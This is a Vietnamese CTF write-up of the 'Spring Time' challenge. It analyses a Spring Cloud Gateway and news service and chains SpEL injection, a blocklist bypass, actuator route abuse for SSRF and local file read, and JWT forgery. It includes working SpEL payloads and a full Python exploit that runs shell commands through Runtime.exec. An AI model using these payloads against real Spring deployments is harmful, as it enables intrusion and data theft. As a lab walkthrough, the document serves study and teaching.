---
title: Spring Time CTF challenge WriteUp
categories: [pentesting, Web-Exploitation, CTF]
tags: [CTF, Web]
---

# Spring Time CTF challenge WriteUp

![image](https://hackmd.io/_uploads/r14_Z7wRgx.png)

Web App được chia làm 2 services khác nhau bao gồm:

- gateman : port 8080
- newsman : port 8082

### Phân tích từng chức năng từng service

- **Gateman** 

![image](https://hackmd.io/_uploads/r1d3imwRee.png)

Nó được chạy bằng port 8080 bên cạnh đó nó còn gọi cloud cùng với đó là expose include ra các chức năng như `health` , `info` , `gateway`. Vậy nên có thể biết được đây là service `Spring Cloud` với chức năng routing đến các `routes`.

- **Newsman**

Ta sẽ đi thẳng vào luôn đầu tiên là `NewsController.class`: 

```java 
// Source code is decompiled from a .class file using FernFlower decompiler (from Intellij IDEA).
package io.newsman.web;

import io.newsman.model.News;
import io.newsman.model.RoleEnum;
import io.newsman.model.User;
import java.time.LocalDate;
import java.util.List;
import java.util.Map;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.PutMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import reactor.core.publisher.Flux;
import reactor.core.publisher.Mono;

@RestController
@RequestMapping({"/news"})
public class NewsController {
   private final List<News> newsStore = NewsDB.getNewsStore();
   private final NewsService newsService = new NewsService();

   public NewsController() {
   }

   @GetMapping
   public Flux<News> getAllNews() {
      return Flux.fromIterable(this.newsStore);
   }

   @GetMapping({"/{id}"})
   public Mono<News> getNewsById(@PathVariable String id) {
      return Flux.fromIterable(this.newsStore).filter((news) -> {
         return news.getId().equals(id);
      }).next();
   }

   @PostMapping
   public Mono<News> addNews(@RequestBody News newNews) {
      if (newNews.getDate() == null) {
         newNews.setDate(LocalDate.now());
      }

      this.newsStore.add(newNews);
      return Mono.just(newNews);
   }

   @PutMapping({"/{id}"})
   public Mono<News> updateNews(@PathVariable String id, @RequestBody News updatedNews) {
      return Flux.fromIterable(this.newsStore).filter((news) -> {
         return news.getId().equals(id);
      }).next().flatMap((existing) -> {
         existing.setTitle(updatedNews.getTitle());
         existing.setDescription(updatedNews.getDescription());
         existing.setBody(updatedNews.getBody());
         existing.setAuthor(updatedNews.getAuthor());
         existing.setDraft(updatedNews.isDraft());
         existing.setDate(LocalDate.now());
         return Mono.just(existing);
      });
   }

   @GetMapping({"/{id}/view"})
   public Mono<String> renderNewsBody(@RequestHeader("Authorization") String authHeader, @PathVariable String id) {
      String token = authHeader.replace("Bearer ", "");
      Map<String, Object> tokenBody = this.newsService.getTokenBody(token);
      User user = new User();
      user.setName((String)tokenBody.get("sub"));
      user.setRole(RoleEnum.valueOf((String)tokenBody.get("role")));
      return Flux.fromIterable(this.newsStore).filter((news) -> {
         return news.getId().equals(id);
      }).next().map((news) -> {
         return this.newsService.render(news.getBody(), user);
      });
   }
}
```

![image](https://hackmd.io/_uploads/BJvCyED0gx.png)

Đầu tiên là 2 annotation chính là `@RestController` và `@RequestMapping` sau đó khởi tạo class `NewsController` chứa các thuộc tính là `newsStore` và `newsService` : 

- **newsStore**: Một danh sách (List) các đối tượng News, được khởi tạo từ NewsDB.getNewsStore().
- **newsService**: Một đối tượng của lớp NewsService, chứa các logic liên quan đến tin tức.

Tiếp đến là các endpoints khác nhau được HTTP xử lý : 

#### **Lấy tất cả tin tức (getAllNews)**

![image](https://hackmd.io/_uploads/rJLMbNvAlg.png)

Xử lý yêu cầu GET đến đường dẫn `/news`, phương thức `getAllNews()` trả về một `Flux<News>`. Flux là một đối tượng của Project Reactor, đại diện cho một chuỗi (sequence) gồm 0 hoặc nhiều phần tử.

- **Lấy tin tức theo id (getNewsById)**

![image](https://hackmd.io/_uploads/BJYYZVwCgl.png)

Xử lý news theo url id cụ thể ví dụ như `/news/123` nó sẽ tìm kiếm trong `newsStore` để tìm ra tin tức có id tương ứng để trả về cho user.

#### **Thêm tin tức mới (addNews)**

![image](https://hackmd.io/_uploads/SJmNG4DCeg.png)

Xử lý yêu cầu POST đến đường dẫn /news để tạo một tin tức mới.

Logic:
 + @RequestBody chuyển đổi nội dung (body) của yêu cầu (JSON) thành một đối tượng News.
+ Nếu ngày tháng của tin tức mới chưa được thiết lập, nó sẽ được gán bằng ngày hiện tại.
+ Tin tức mới sau đó được thêm vào newsStore.
+ Phương thức trả về một Mono `<News>` chứa thông tin về tin tức vừa được tạo.

#### **Cập nhật tin tức (updateNews)**

![image](https://hackmd.io/_uploads/rklX7NDAxl.png)

Xử lý yêu cầu PUT đến đường dẫn của một tin tức cụ thể (ví dụ: /news/123) để cập nhật thông tin của nó.

Logic:
+ Lấy id từ đường dẫn và dữ liệu cập nhật từ body của yêu cầu.
+ Tìm tin tức hiện có với id tương ứng.
+ Cập nhật các thuộc tính của tin tức hiện có bằng dữ liệu từ updatedNews.
+ Gán ngày cập nhật là ngày hiện tại.
+ Trả về một Mono `<News>` chứa thông tin tin tức đã được cập nhật.
    
#### **Xem nội dung tin tức ()**
    
![image](https://hackmd.io/_uploads/BJdxDVvRxx.png)

- Xử lý yêu cầu GET đến đường dẫn /news/{id}/view để xem nội dung của một tin tức đã được `render`.
- @RequestHeader("Authorization") lấy giá trị của header Authorization từ yêu cầu. Header này thường chứa một token xác thực.
- Trích xuất token bằng cách loại bỏ phần "Bearer ".
- Sử dụng newsService.getTokenBody(token) để giải mã token và lấy thông tin người dùng.
- Tạo một đối tượng User.
- Tìm tin tức với id tương ứng.
- Sử dụng newsService.render(news.getBody(), user) để xử lý và trả về nội dung của tin tức.
- Cuối cùng, trả về một Mono `<String>` chứa nội dung đã được xử lý của tin tức.

### Tìm kiếm sink có thể exploit

Sau khi phân tích source trên ta có thể thấy rằng ta hoàn toàn có thể thực hiện SpEL Injection bằng chức năng view. Ở đây kịch bản tấn công sẽ là đăng bài có chứa content của SpEL bằng hàm `updateNews` sau đó truy cập đến với `/id/view` để có thể trigger được method render sau đó thực thi SpEL body mà ta đã update lên.

**Luồng Tấn Công (Attack Flow)**

- Điểm vào (Entry Point): Attacker có thể kiểm soát nội dung của trường body trong một đối tượng News. Attacker có thể làm điều này bằng cách gửi một yêu cầu POST tới endpoint /news (hàm addNews) hoặc một yêu cầu PUT tới endpoint /news/{id} (hàm updateNews). Dữ liệu này được lưu trữ trong newsStore.
- Điểm Thực thi (Execution Sink): Khi user gửi yêu cầu GET tới endpoint `/{id}/view` (hàm renderNewsBody), ứng dụng sẽ thực hiện các bước sau:
- Nó lấy đối tượng News từ newsStore dựa trên id.
- Nó lấy trường body của đối tượng News đó (đây chính là nội dung do attacker kiểm soát).
- Nó gọi hàm newsService.render(news.getBody(), user).

![image](https://hackmd.io/_uploads/r1JkV_vCgx.png)

Ở class `NewsService.class` ta có đoạn này : 

```java 
// NewsService.java
public String render(String bodyTemplate, Object model) {
   SafeEvaluationContext ctx = new SafeEvaluationContext(model);
   // Dòng mã cốt lõi gây ra vấn đề nằm ở đây
   return (String)this.parser.parseExpression(bodyTemplate, this.templateParser).getValue(ctx, String.class);
}
```

**Bước 1: Phân tích (Parsing) - "Đọc và Hiểu Biểu Thức"**

Phần này của code chịu trách nhiệm đọc chuỗi đầu vào và chuyển nó thành một biểu thức có thể thực thi được:

```java 
this.parser.parseExpression(bodyTemplate, this.templateParser)
```

- **this.parser**: Đây là một đối tượng của lớp SpelExpressionParser. Nhiệm vụ của nó giống như một "trình biên dịch" cho ngôn ngữ SpEL. Nó nhận một chuỗi văn bản và phân tích cú pháp của nó để xem liệu nó có phải là một biểu thức SpEL hợp lệ hay không.
- **bodyTemplate**: Đây chính là chuỗi news.getBody() được lấy từ cơ sở dữ liệu. Đây là điểm mấu chốt của lỗ hổng, vì chuỗi này đến từ người dùng và không được lọc hay kiểm tra. Kẻ tấn công có thể chèn mã SpEL độc hại vào đây, ví dụ: #{T(java.lang.Runtime).getRuntime().exec('calc.exe')}.
- **this.templateParser**: Đây là một đối tượng TemplateParserContext. Bối cảnh (context) này chỉ thị cho parser rằng nó không nên coi toàn bộ chuỗi bodyTemplate là một biểu thức duy nhất. Thay vào đó, nó nên tìm kiếm các biểu thức được nhúng bên trong chuỗi theo một cú pháp đặc biệt. Cú pháp mặc định là #{ biểu_thức }.
- Kết quả của bước này: parseExpression trả về một đối tượng Expression. Đối tượng này là phiên bản đã được "biên dịch" và sẵn sàng để thực thi của chuỗi SpEL mà nó tìm thấy trong bodyTemplate. Nếu không tìm thấy biểu thức #{...}, nó sẽ coi toàn bộ chuỗi là văn bản thông thường.

**Bước 2: Thực thi (Execution) - "Chạy Biểu Thức"**
Sau khi đã có đối tượng Expression, phần còn lại của dòng mã sẽ thực thi nó:

```java 
.getValue(ctx, String.class)
```

- **.getValue(...)**: Đây là phương thức thực hiện hành động. Nó lấy đối tượng Expression đã được biên dịch và chạy nó.
- **ctx**: Đây là EvaluationContext (bối cảnh đánh giá). Nó cung cấp "môi trường" cho biểu thức chạy. Nó chứa các biến, hàm và đối tượng mà biểu thức có thể truy cập. Trong trường hợp này, ctx chứa đối tượng user (được truyền vào dưới dạng model).

Từ đây ta đã tìm được sink để có thể khai thác còn nếu muốn hiểu rõ hơn thì nên decompile phần SPRING-EXPRESSION-6.2.11.

![image](https://hackmd.io/_uploads/BJmnt_wAxx.png)

Vậy là bước đầu ta đã biết được vì sao có thể chạy SpEL và thực thi để thực thi SpEL Injection nhưng có một vấn đề là ở class SafeEvaluationContext nó đã dùng black list chặn đi `class` `getclass` `forname` nhưng dựa theo ý tưởng của `CVE-2025-48734` ta hoàn toàn có thể sử dụng hàm `getDeclaringClass()` để bypass và dẫn đến SSRF để truy cập vào service nội bộ qua đó từ đây ta có thể tạo một kênh có thể truy cập từ bên ngoài đến trong service nội bộ : 

- Lỗ hổng xảy ra trong Apache Commons BeanUtils, nơi declaredClass property của các enum Java có thể bị truy cập thông qua một cơ chế không được bảo vệ.
- Điều này cho phép kẻ tấn công truy cập ClassLoader của ứng dụng, dẫn đến khả năng thao tác với các tài nguyên thông qua Reflection hoặc các API của Java.

[CVE-2025-48734](https://github.com/advisories/GHSA-wxr5-93ph-8wr9)

![image](https://hackmd.io/_uploads/rJ8s_iv0xg.png)

Với case sử dụng SpEL như này và trong trường hợp này ta phải có jwt token của admin để có thể update các bài viết thì ta cần jwt secret để có thể mạo danh admin.

![image](https://hackmd.io/_uploads/HyUtWnv0ge.png)


Ở đây nó đã cấp cho ta secret jwt nên ta sẽ tham khảo cách mà `CVE-2025-41243` hoạt động ở bài viết này : 
[CVE-2025-41243](https://psytester.github.io/CVE-2025-41243_Spring_SpEL_property_modification/)

Với case này ta hoàn toàn có thể tận dụng để thực thi SpEL Injection cùng với đó là lợi dụng SSRF ở trên để đọc system path bên trong thay vì trỏ đến resources vì ở đây nó không hề giới hạn quyền access đến các gateway của Spring-cloud nên ta có thể lợi dụng 2 CVE đó ở đây SpEL được dùng để thực thi cách lệnh hệ thống như là `ls` hoặc `cat` thông qua java reflection api cùng với đó là tận dụng cầu nối từ SSRF để truy cập nội bộ nên ta có một cái sink hoàn chỉnh.

![image](https://hackmd.io/_uploads/ByoHz3vAxe.png)


![image](https://hackmd.io/_uploads/ry2SrtwCle.png)

Truy cập đến url `http://localhost:8080/actuator/gateway/routes` ta có thể thấy được routes cũ hay cho nó là default đi luôn bây giờ ta sẽ tạo một route mới xem thử nó sẽ như thế nào.

![image](https://hackmd.io/_uploads/ryQtUYv0ll.png)

Tạo route mới có tên testabc ở phần server trả về 201 đã thành công tạo bây giờ ta sẽ refresh để apply route mới vào.

![image](https://hackmd.io/_uploads/ryxXwYvClg.png)

Thành công refresh lại.

Trong payload của ta sẽ có các filter để áp dụng vào trong route bao gồm : 

- **Filter 1: Bypass hạn chế truy cập SpEL**

```json 
{
  "name": "AddResponseHeader",
  "args": {
    "name": "Test",
    "value": "#{@systemProperties['spring.cloud.gateway.server.webflux.restrictive-property-accessor.enabled'] = false}"
  }
}
```

Mục đích:
- Vô hiệu hóa thuộc tính spring.cloud.gateway.server.webflux.restrictive-property-accessor.enabled, vốn mặc định là true.
Hành động:
- Thuộc tính này kiểm soát quyền truy cập vào các property nhạy cảm trong Spring WebFlux. Khi được đặt thành false, nó cho phép SpEL truy cập và chỉnh sửa những property hoặc thực thi các phương thức nguy hiểm.
Hậu quả:
- Các filter khác có thể sử dụng SpEL để thực hiện các hành động nguy hiểm hơn, chẳng hạn như đọc hoặc ghi dữ liệu nhạy cảm.

- **Filter 2: Expose file system qua mapping /webjars/**

```json 
{
  "name": "AddResponseHeader",
  "args": {
    "name": "Test",
    "value": "#{@resourceHandlerMapping.urlMap['/webjars/**'].locationValues[0]='file:///' }"
  }
}
```

Mục đích:
- Thay đổi mapping của đường dẫn /webjars/** để trỏ đến hệ thống file cục bộ (file:///).
Hành động:
- Thuộc tính urlMap của bean resourceHandlerMapping được chỉnh sửa để ánh xạ mọi request tới /webjars/** vào hệ thống tệp cục bộ.
Hậu quả:
- Kẻ tấn công có thể truy cập file system của máy chủ thông qua HTTP chẳng hạn như là `GET /webjars/etc/passwd`.

- **Filter 3: Áp dụng thay đổi mapping**

```json 
{
  "name": "AddResponseHeader",
  "args": {
    "name": "Test",
    "value": "#{@resourceHandlerMapping.urlMap['/webjars/**'].afterPropertiesSet}"
  }
}
```

Mục đích:
- Gọi phương thức afterPropertiesSet của bean resourceHandlerMapping để áp dụng thay đổi mapping được thực hiện ở filter 2.
Hành động:
- Phương thức afterPropertiesSet được gọi để tái cấu hình bean resourceHandlerMapping, đảm bảo rằng mapping /webjars/** tới file:/// có hiệu lực.
Hậu quả:
- Các thay đổi mapping sẽ được kích hoạt ngay lập tức, cho phép attacker khai thác file system qua HTTP.

![image](https://hackmd.io/_uploads/SkEgYYPCel.png)

Thành công đọc được `etc/passwd` vậy là ta đã có hướng để có thể khai thác vào service nội bộ, bây giờ vẫn flow như cũ nhưng ta sẽ khai thác ở localhost:8082 là NewsMan service.

![image](https://hackmd.io/_uploads/BkT1AYwCge.png)

Ở phần security ta thấy nó xử lý phần authen bằng jwt 

![image](https://hackmd.io/_uploads/SytrRtDRgg.png)

Bên cạnh đó nó còn gọi thêm 1 biến role để gán vào jwt.

![image](https://hackmd.io/_uploads/ByyqAtvAxx.png)

Có 3 role chính là `ADMIN` `USER` `VIEWER` .

### Exploit

Bây giờ dựa vào POC ở bên trên đã cho ta thấy rằng SpEL Injection sử dụng CVE-2025-41243 và thành công đọc được `/etc/passwd` bây giờ ta sẽ sẽ khai thác service NewsMan.

{% raw %}
```python 
import base64
import hashlib
import hmac
import json
import time
import requests
import re

secret = 'fake_secret_for_testing'
base_url = 'http://localhost:8080'
headers = {'Content-Type': 'application/json'}

# === 1. Generate JWT token ===
def generate_jwt():
    key = hashlib.sha256(secret.encode()).hexdigest().encode()
    header = {'alg': 'HS256', 'typ': 'JWT'}
    payload = {
        'sub': 'admin',
        'role': 'ADMIN',
        'iat': int(time.time()),
        'exp': int(time.time()) + 3600
    }

    b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=')
    signing = b'.'.join([
        b64(json.dumps(header, separators=(',', ':')).encode()),
        b64(json.dumps(payload, separators=(',', ':')).encode())
    ])
    sig = base64.urlsafe_b64encode(hmac.new(key, signing, hashlib.sha256).digest()).rstrip(b'=')
    return (signing + b'.' + sig).decode()

token = generate_jwt()
auth_header = {'Authorization': f'Bearer {token}'}

# === 2. Đăng ký route gateway ===
requests.post(
    f'{base_url}/actuator/gateway/routes/news',
    headers=headers,
    json={
        "id": "news",
        "predicates": [{"name": "Path", "args": {"_genkey_0": "/news/**"}}],
        "uri": "http://127.0.0.1:8082"
    }
)
requests.post(f'{base_url}/actuator/gateway/refresh')

# === 3. Gửi payload SpEL để lấy tên flag qua ls ===
payload_ls = {
    "id": "1",
    "title": "t",
    "description": "d",
    "body": "#{role.getDeclaringClass().getClassLoader().loadClass(\"java.util.Scanner\").getConstructors().?[getParameterCount()==1 and getParameterTypes()[0].getName().equals(\"java.io.InputStream\")][0].newInstance(role.getDeclaringClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"ls /app\").getInputStream()).useDelimiter(\"\\\\A\").next()}",
    "author": "a",
    "draft": False
}
requests.put(f'{base_url}/news/1', headers={**headers, **auth_header}, json=payload_ls)

resp_ls = requests.get(f'{base_url}/news/1/view', headers=auth_header)
flag_file = re.search(r'flag-[\w\d]+', resp_ls.text)
if not flag_file:
    print("Không tìm thấy flag file")
    exit(1)

flag_name = flag_file.group(0)
print(f"Found flag: {flag_name}")

payload_cat = {
    "id": "1",
    "title": "t",
    "description": "d",
    "body": f"#{{role.getDeclaringClass().getClassLoader().loadClass(\"java.util.Scanner\").getConstructors().?[getParameterCount()==1 and getParameterTypes()[0].getName().equals(\"java.io.InputStream\")][0].newInstance(role.getDeclaringClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"cat /app/{flag_name}\").getInputStream()).useDelimiter(\"\\\\A\").next()}}",
    "author": "a",
    "draft": False
}
requests.put(f'{base_url}/news/1', headers={**headers, **auth_header}, json=payload_cat)

resp_flag = requests.get(f'{base_url}/news/1/view', headers=auth_header)
print("\nFlag output:")
print(resp_flag.text)
```
{% endraw %}

**Luồng hoạt động tổng quan**
**1. Tạo JWT Token:**
- Script tạo token giả mạo với quyền admin để bỏ qua cơ chế xác thực.

**2. Đăng ký Route Gateway:**
- Route /news/** được đăng ký trong Spring Cloud Gateway để chuyển tiếp yêu cầu đến Newsman. (SSRF)

**3. Liệt kê file trong /app:**
- Payload SpEL thực thi lệnh ls /app để liệt kê file.
Script tìm tên file flag trong kết quả trả về.

**4. Đọc nội dung file flag:**
- Payload SpEL thực thi lệnh cat trên file flag để đọc nội dung.
Script hiển thị nội dung flag.

![image](https://hackmd.io/_uploads/ryC0VhP0ee.png)

#### Giải thích Payload và Cách Hoạt Động

**Payload Lệnh ls trong Body :**

1. SpEL Injection

```java 
"body": "#{role.getDeclaringClass().getClassLoader().loadClass(\"java.util.Scanner\").getConstructors().?[getParameterCount()==1 and getParameterTypes()[0].getName().equals(\"java.io.InputStream\")][0].newInstance(role.getDeclaringClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"ls /app\").getInputStream()).useDelimiter(\"\\\\A\").next()}"
```

- SpEL (Spring Expression Language) là một ngôn ngữ biểu thức được hỗ trợ bởi Spring Framework để thao tác với các đối tượng runtime trong ứng dụng.
- Ở đây, lỗ hổng cho phép attacker đưa nội dung SpEL độc hại vào trường body thông qua endpoint /news/1 (hàm updateNews).
- Sau đó, nội dung này được thực thi khi gọi endpoint /news/1/view, nơi hàm renderNewsBody sử dụng newsService.render() để xử lý nội dung trong body.

2. Cách Payload Hoạt Động

- Truy cập ClassLoader của role:

```java 
role.getDeclaringClass().getClassLoader()
```

- role: Là một biến có giá trị truyền vào EvaluationContext của SpEL.
- getDeclaringClass(): Lấy lớp khai báo của role.
- getClassLoader(): Truy cập ClassLoader của lớp này, cho phép tải các lớp khác trong JVM.

3. Sử dụng Reflection để tải lớp java.util.Scanner:

```java 
.loadClass("java.util.Scanner")
```

Tải lớp Scanner từ Java API. Lớp này được sử dụng để đọc dữ liệu từ một InputStream.

4. Lấy Constructor phù hợp:

```java 
.getConstructors().?[getParameterCount()==1 and getParameterTypes()[0].getName().equals("java.io.InputStream")][0]
```

- .getConstructors(): Lấy danh sách các constructor của Scanner.
- ?[...]: Lọc constructor có duy nhất một tham số, và tham số đó là java.io.InputStream.
- [0]: Lấy constructor đầu tiên phù hợp.

5. Tạo một đối tượng Scanner:

```java 
.newInstance(...)
```

- Tạo một thể hiện của lớp Scanner bằng cách truyền vào một InputStream.

6. Thực thi lệnh ls /app:

```java 
role.getDeclaringClass().getClassLoader().loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("ls /app").getInputStream()
```

- Tải lớp java.lang.Runtime.
- Lấy phương thức getRuntime() để truy cập đối tượng Runtime.
- Gọi phương thức exec("ls /app") để thực thi lệnh ls /app trên hệ thống.
- Kết quả của lệnh được trả về dưới dạng một InputStream.

7. Đọc kết quả từ InputStream:

```java 
.useDelimiter("\\\\A").next()
```

- Sử dụng Scanner để đọc toàn bộ nội dung từ InputStream (kết quả của lệnh ls).
- useDelimiter("\\\\A"): Đặt dấu phân cách là toàn bộ nội dung (\A là ký hiệu cho toàn bộ chuỗi).
- next(): Lấy toàn bộ nội dung từ InputStream.

#### Cách Kết Quả Được Trả Về
Gửi Request để Cập Nhật body:

- Khi bạn gửi payload qua endpoint /news/1 (hàm updateNews), nội dung payload được lưu vào field body trong đối tượng News.

Trigger SpEL Injection:

- Khi bạn truy cập endpoint /news/1/view (hàm renderNewsBody), nội dung body được xử lý bởi hàm newsService.render():

```java 
this.parser.parseExpression(bodyTemplate, this.templateParser).getValue(ctx, String.class);
```

- Tại đây, nội dung body chứa biểu thức SpEL được phân tích cú pháp và thực thi.

Thực thi Lệnh Qua SpEL:

- SpEL biểu thức trong body thực thi lệnh ls /app, kết quả được đọc từ -  - InputStream và trả về dưới dạng chuỗi.
Phản hồi Kết Quả:

- Kết quả của lệnh (ví dụ: danh sách file trong /app) được trả về qua API /news/1/view dưới dạng phản hồi HTTP.

Reflective:

Trong trường hợp này, kết quả được trả về từ ứng dụng dưới dạng phản hồi HTTP thông qua cơ chế Reflection:

- Reflection: Payload tận dụng Reflection API của Java để thực thi lệnh (thông qua Runtime.exec).
- SSRF Payload: Kết quả của payload được phản ánh (reflect) qua API /news/1/view.